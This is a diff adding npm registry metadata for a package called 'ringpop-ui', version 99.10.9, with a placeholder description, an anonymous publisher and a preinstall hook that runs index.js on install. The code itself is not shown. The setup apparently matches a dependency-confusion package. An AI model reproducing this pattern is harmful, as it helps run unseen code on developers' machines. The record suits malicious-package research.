@@ -1,0 +1,62 @@
+{
+    "_id": "ringpop-ui",
+    "name": "ringpop-ui",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "ringpop-ui",
+            "version": "99.10.9",
+            "description": "azbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "ringpop-ui@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-sbq3rywMi+BUQqftb8bvPjTk5U3svtdhpW71DjEeg4257eJPxR8YkQfuBCp22LKCMQ08t+w51QvKTA98LlH9Lg==",
+                "shasum": "a925f00acb286c0fa7fc25e75bf42efbac4239a4",
+                "tarball": "https://registry.npmjs.org/ringpop-ui/-/ringpop-ui-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5062,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPJZ0ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoPFg/5AdhdFiYCG0DCfdshsCtNOgQZWA7Au/Cjl1+ftbBV2HGGIsUa\r\nli5wknQUEHYrnOBa46enas1pQl7m3wGvb1k7x9+DjTHYqJZsVnQyqw6Xx7MA\r\ny8RhZkfDccNW8e9+xEiiOBmGKDoiHPk0L7afTo92oZR7157ZJ5YApq2MXfr7\r\n29d6xWHJW7EetI/FGoYfhxOPP6a3XFUJ/lCoLzI01MQZUIo0BEahdZOn/l55\r\ndUrT3E3QoD/IZEdn0k8bS3NDt0T7SyJ/W9/evC5QSIZnnImh7xGeQ/Te/XPc\r\nB3LJ7dqf246hrWhILPC1wasJs/T4URveSCFgeAgwH0i4eLbdJuNZjmh4nZSZ\r\nfCKEZHqQH2qs0+5DfBoiTQXpTfkYqBcMAKuHWomacZh2pek8pTWJeILLQeEY\r\nd6lTtiIpE14OHTP5CK5hNLL5O4GAWaupdFJQLjrFeiVhIozB1XIaVSs5ctXO\r\n7rp1qJaU0f9r6Dfh6Pic8490G0+1iw+qlgkVns6t1LVxPPw5MVoaUMNzBuV2\r\nxYQJN+ffFJoEn0sJPdMXUB7S2FdyMklNq38jbd+0RmAEdMAz/9PzTxbSTtoL\r\nFngglCISg3B3t9JzLQYifdqch6da42Ovx/TseAT2tx6pfZ9T269m7Qb7d8uW\r\nNvl5wbBMZUxz8k6c2MXaC2+awrY579w1Kp8=\r\n=0ET6\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "qitn0yxv",
+                "email": "qitn0yxv@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "qitn0yxv",
+                    "email": "qitn0yxv@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/ringpop-ui_99.10.9_1648137844451_0.9065235794154884"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T16:04:04.451Z",
+        "99.10.9": "2022-03-24T16:04:04.577Z",
+        "modified": "2022-03-24T16:04:04.678Z"
+    },
+    "maintainers": [
+        {
+            "name": "qitn0yxv",
+            "email": "qitn0yxv@rt11.ml"
+        }
+    ],
+    "description": "azbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
